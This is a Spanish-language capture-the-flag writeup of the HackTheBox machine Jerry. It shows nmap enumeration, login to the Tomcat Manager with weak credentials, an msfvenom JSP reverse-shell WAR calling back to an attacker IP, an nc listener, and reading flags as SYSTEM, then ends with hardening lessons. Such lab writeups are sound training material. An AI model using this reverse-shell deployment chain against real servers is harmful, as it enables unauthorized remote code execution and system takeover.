---
title: "HackTheBox Jerry: de Tomcat a SYSTEM"
description: "Writeup de Jerry, máquina Windows de HackTheBox: enumeración del servicio Tomcat, acceso al Manager, despliegue de una WAR y lectura de las dos flags."
author: "Zuk4r1"
date: "2026-09-30"
published: true
tags: ["hackthebox", "windows", "tomcat", "writeup", "privilege-escalation"]
readTime: "7 min"
---

## Introducción

Jerry es una máquina Windows de dificultad sencilla cuyo punto de entrada es Apache Tomcat. La enumeración revela el panel de administración; unas credenciales débiles permiten desplegar una aplicación Java preparada para devolver una shell. El proceso de Tomcat se ejecuta con privilegios de `NT AUTHORITY\\SYSTEM`, por lo que el acceso inicial basta para leer las dos flags.

La resolución se limita al laboratorio autorizado de HackTheBox. Las direcciones IP y de callback de los ejemplos deben sustituirse por las asignadas a tu sesión.

## 1. Reconocimiento

Primero identifico los puertos y servicios expuestos:

```bash
nmap -Pn -sC -sV -p- <IP_OBJETIVO>
```

El servicio que marca el camino es HTTP en el puerto `8080`, servido por Apache Tomcat. Confirmo la aplicación en el navegador o con `curl`:

```bash
curl -i http://<IP_OBJETIVO>:8080/
```

La página predeterminada de Tomcat justifica revisar las rutas del Manager:

```text
/manager/html
```

## 2. Acceso al Manager

El panel solicita autenticación. En esta máquina, las credenciales débiles `tomcat:s3cret` permiten acceder al administrador. Si no funcionan en otro entorno, no conviene asumir que son universales: hay que volver a enumerar y validar la configuración concreta.

El Manager permite desplegar aplicaciones Java empaquetadas como archivos WAR. Como Tomcat ejecuta las aplicaciones bajo la cuenta del servicio, desplegar una aplicación controlada equivale a obtener ejecución de comandos con ese mismo contexto.

## 3. Preparar y desplegar una aplicación

Desde una máquina de laboratorio, genero una WAR de reverse shell con `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f war -o shell.war
```

En el panel `/manager/html`, uso la sección de despliegue para subir `shell.war`. El nombre del archivo determina el contexto de la aplicación, en este caso `/shell`.

Antes de activar la aplicación, dejo un listener escuchando en el puerto elegido:

```bash
nc -lvnp 4444
```

Después solicito la ruta de la aplicación desplegada:

```text
http://<IP_OBJETIVO>:8080/shell/
```

La petición ejecuta el JSP y, si la conectividad de retorno está permitida, recibo la conexión en el listener.

## 4. Confirmar el contexto y leer las flags

En la shell compruebo la identidad y el sistema:

```cmd
whoami
```

El resultado esperado en esta máquina es `nt authority\\system`. No hace falta una fase separada de escalada de privilegios: el proceso de Tomcat ya corre con privilegios de sistema.

Jerry guarda ambas flags en el mismo archivo. Localizo el directorio de flags y leo el archivo desde la shell:

```cmd
dir "C:\Users\Administrator\Desktop\flags"
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

Con eso quedan obtenidas la flag de usuario y la de root.

## Conclusiones

La cadena de ataque de Jerry es corta, pero deja varias lecciones claras:

- Un panel de administración expuesto amplía mucho la superficie de ataque.
- Las credenciales predeterminadas o débiles deben cambiarse y no exponerse a redes no confiables.
- Permitir despliegues desde el Manager equivale a confiar en quien tenga acceso al panel.
- Tomcat debe ejecutarse con una cuenta de servicio de mínimos privilegios, nunca como `SYSTEM`.

La máquina se completa con reconocimiento del servicio, acceso al Manager y despliegue de una aplicación. La enumeración y la comprobación del usuario efectivo son las que explican por qué no existe una escalada adicional en esta resolución.
